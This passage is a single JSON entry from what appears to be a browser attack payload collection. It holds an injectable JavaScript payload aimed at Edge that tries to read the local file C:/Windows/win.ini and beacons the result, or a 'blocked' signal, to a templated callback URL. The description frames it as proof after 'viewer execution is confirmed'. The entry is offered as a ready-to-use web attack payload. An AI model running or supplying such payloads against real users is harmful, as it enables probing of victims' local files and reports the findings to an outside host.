      "id": "edge_file_local_probe",
      "category": "file_system",
      "browser": "edge",
      "technique": "local_file_fetch_probe",
      "payload": "(function(){var base='{url}';var sep=base.indexOf('?')===-1?'?':'&';fetch('file:///C:/Windows/win.ini').then(function(r){return r.text().then(function(t){navigator.sendBeacon(base+sep+'probe=edge-file-fetch',JSON.stringify({status:r.status,length:t.length}));});}).catch(function(){(new Image()).src=base+sep+'probe=edge-file-fetch-blocked';});})();",
      "description": "Local Windows resource reachability check with callback proof, intended only after viewer execution is confirmed.",
